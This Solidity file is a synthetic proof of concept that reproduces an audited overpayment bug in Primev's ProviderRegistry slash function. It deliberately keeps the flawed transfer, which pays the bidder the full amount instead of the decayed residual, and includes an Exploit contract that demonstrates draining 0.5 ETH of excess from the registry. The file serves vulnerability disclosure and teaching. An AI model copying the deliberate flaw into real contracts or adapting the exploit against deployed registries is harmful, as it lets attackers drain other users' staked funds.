// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Primev — Overpayment to Bidder in Slash Function Due to Incorrect
    Amount Transfer (Cantina, #46246)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable ProviderRegistry.slash body is reduced with the blamed
    `bidder` payment of the full `amt` preserved — it should pay
    `residualAmt` (amount after decay). A 50% residual decay still sends the
    full slash amount to the bidder, overpaying by residualAmt's complement
    and draining the registry's ETH at other providers' expense (no fork,
    no cheats).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: slash correctly computes
        residualAmt = (amt * residualBidPercentAfterDecay) / ONE_HUNDRED_PERCENT
    and correctly reduces the provider's stake by residualAmt + fee, but then
    transfers the FULL `amt` to the bidder instead of `residualAmt`.

    Recommended fix (per report): `bidder.send(residualAmt)` / call with residualAmt.
//////////////////////////////////////////////////////////////*/

/// @dev Reduced ProviderRegistry — stake register + slash with the blamed transfer.
contract ProviderRegistry {
    uint256 public constant PRECISION = 1e16;
    uint256 public constant ONE_HUNDRED_PERCENT = 100 * PRECISION;
    uint256 public feePercent = 5 * PRECISION; // 5%

    address public preconfManager;
    mapping(address => uint256) public providerStake;

    event Slashed(address indexed provider, address indexed bidder, uint256 amt, uint256 residualAmt);

    function setPreconfManager(address m) external {
        preconfManager = m;
    }

    function registerAndStake() external payable {
        providerStake[msg.sender] += msg.value;
    }

    function getProviderStake(address p) external view returns (uint256) {
        return providerStake[p];
    }

    /// @dev VERBATIM-logic reduction of ProviderRegistry.slash — residual is
    ///      computed correctly, but the bidder is paid `amt` instead of `residualAmt`.
    function slash(
        uint256 amt,
        address provider,
        address payable bidder,
        uint256 residualBidPercentAfterDecay
    ) external {
        require(msg.sender == preconfManager, "only preconf");
        require(providerStake[provider] >= amt, "stake");

        uint256 residualAmt = (amt * residualBidPercentAfterDecay) / ONE_HUNDRED_PERCENT;
        uint256 penaltyFee = (residualAmt * feePercent) / ONE_HUNDRED_PERCENT;
        uint256 totalDeduct = residualAmt + penaltyFee;
        require(providerStake[provider] >= totalDeduct, "deduct");

        providerStake[provider] -= totalDeduct;

        // FIX: (bool ok, ) = bidder.call{value: residualAmt}("");
        (bool ok, ) = bidder.call{value: amt}(""); // @> VULN: pays full `amt` to bidder instead of the decayed `residualAmt`
        require(ok, "send bidder");

        emit Slashed(provider, bidder, amt, residualAmt);
    }

    receive() external payable {}
}

/// @dev Bidder / profit receiver.
contract Bidder {
    receive() external payable {}
}

/// @dev Provider helper that can stake.
contract Provider {
    function stake(ProviderRegistry reg) external payable {
        reg.registerAndStake{value: msg.value}();
    }

    receive() external payable {}
}

/// @notice Orchestrator.
/// CREATE order: (1) registry (2) provider (3) bidder
contract Exploit {
    ProviderRegistry public registry; // CREATE nonce 1 — vulnerable
    Provider public provider;         // CREATE nonce 2
    Bidder public bidder;             // CREATE nonce 3 — profit receiver

    uint256 public constant STAKE = 2 ether;
    uint256 public constant SLASH_AMT = 1 ether;

    constructor() {
        registry = new ProviderRegistry();
        provider = new Provider();
        bidder = new Bidder();
        // Allow anyone (this Exploit) to slash by setting preconfManager to this.
        registry.setPreconfManager(address(this));
    }

    /// @dev Fund provider stake. Called from run() with ETH forwarded to Exploit
    ///      (playground fundAttackerWei + value on deploy is not enough for child —
    ///      run() receives no value; we fund via self-balance or setup).
    ///      Playground: setup funds Exploit with ETH; run() uses address(this).balance.
    function run() external {
        // Ensure registry has ETH to overpay from: stake 2 ETH from this contract's balance.
        require(address(this).balance >= STAKE, "need stake ETH");
        provider.stake{value: STAKE}(registry);

        uint256 bidderBefore = address(bidder).balance;
        uint256 residualPercent = 50 * registry.PRECISION(); // 50% residual after decay
        uint256 expectedResidual = (SLASH_AMT * residualPercent) / registry.ONE_HUNDRED_PERCENT();
        // expectedResidual = 0.5 ether

        // Execute slash with 50% residual — bidder SHOULD get 0.5 ETH, GETS 1 ETH.
        registry.slash(SLASH_AMT, address(provider), payable(address(bidder)), residualPercent);

        uint256 received = address(bidder).balance - bidderBefore;
        require(received == SLASH_AMT, "bidder should get full amt (bug)");
        require(received > expectedResidual, "no overpayment");
        uint256 excess = received - expectedResidual;
        require(excess == 0.5 ether, "expected 0.5 ETH excess");
    }

    receive() external payable {}
}
